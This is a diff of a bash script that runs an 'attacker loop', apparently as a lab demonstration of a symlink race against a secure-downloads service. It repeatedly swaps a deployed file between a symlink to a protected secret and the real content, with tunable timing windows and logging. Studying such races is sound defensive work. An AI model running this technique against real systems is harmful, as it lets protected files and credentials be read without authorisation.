@@ -1,37 +1,41 @@
-cat > /tmp/swap_contents.sh <<'BASH'
 #!/usr/bin/env bash
 set -euo pipefail
 
-STORAGE="/tmp/secure-downloads-demo"
-TARGET="$STORAGE/target.txt"
-REAL="$STORAGE/target-real"
-ATTACK="$STORAGE/target-attack"
-TMP_ATTACK="$STORAGE/._attack_tmp"
+BASE="/tmp/secure-downloads-demo"
+SECRET="/tmp/protected/secret.txt"
+REAL_SRC="$BASE/target-real-source"   # permanent source
+DEPLOY_NAME="target.txt"
+TARGET="$BASE/$DEPLOY_NAME"
+TMP_REAL="$BASE/._real_tmp"
+LOG="$BASE/attacker.log"
 
-# ensure attack file exists at start
-if [ ! -f "$ATTACK" ]; then
-  echo "ATTACKER_CONTENT" > "$ATTACK"
-fi
+# tuning (ms)
+ATT_MS=250   # how long symlink to secret stays in place (increase to make demo easier)
+REST_MS=150  # how long real stays in place
+
+# sanity
+mkdir -p "$BASE" /tmp/protected
+[ -f "$REAL_SRC" ] || echo "NORMAL_CONTENT" > "$REAL_SRC"
+[ -f "$SECRET" ]   || echo "TOP_SECRET: do-not-share" > "$SECRET"
+[ -f "$TARGET" ]   || ln "$REAL_SRC" "$TARGET"
+
+att_s=$(awk "BEGIN{printf \"%.3f\", $ATT_MS/1000}")
+rest_s=$(awk "BEGIN{printf \"%.3f\", $REST_MS/1000}")
+
+echo "Starting attacker loop; log -> $LOG"
+echo "ATT_MS=$ATT_MS REST_MS=$REST_MS" > "$LOG"
 
 while true; do
-  # ensure attacker file exists (recreate if needed)
-  if [ ! -f "$ATTACK" ]; then
-    echo "recreating missing attack file"
-    echo "ATTACKER_CONTENT" > "$ATTACK"
-  fi
+  # place symlink at the deployed name pointing at the protected secret (atomic on most Unixes)
+  ln -sfn "$SECRET" "$TARGET"
+  echo "$(date '+%T.%3N') ATTACKER: symlink -> $SECRET (inode $(stat -c %i "$TARGET" 2>/dev/null || echo ?))" | tee -a "$LOG"
 
-  # atomically move attack into place (mv across same FS is atomic)
-  mv -f "$ATTACK" "$TARGET"
+  sleep "$att_s"
 
-  # small window
-  sleep 0.02
+  # restore real without consuming REAL_SRC: create a temporary hardlink to REAL_SRC then mv it into place
+  ln "$REAL_SRC" "$TMP_REAL"
+  mv -f "$TMP_REAL" "$TARGET"
+  echo "$(date '+%T.%3N') ATTACKER: restored real (inode $(stat -c %i "$TARGET" 2>/dev/null || echo ?))" | tee -a "$LOG"
 
-  # restore normal content (atomic replace)
-  cp -f "$REAL" "$TARGET"
-
-  # tiny pause to yield CPU
-  sleep 0.02
+  sleep "$rest_s"
 done
-BASH
-
-chmod +x /tmp/swap_contents.sh
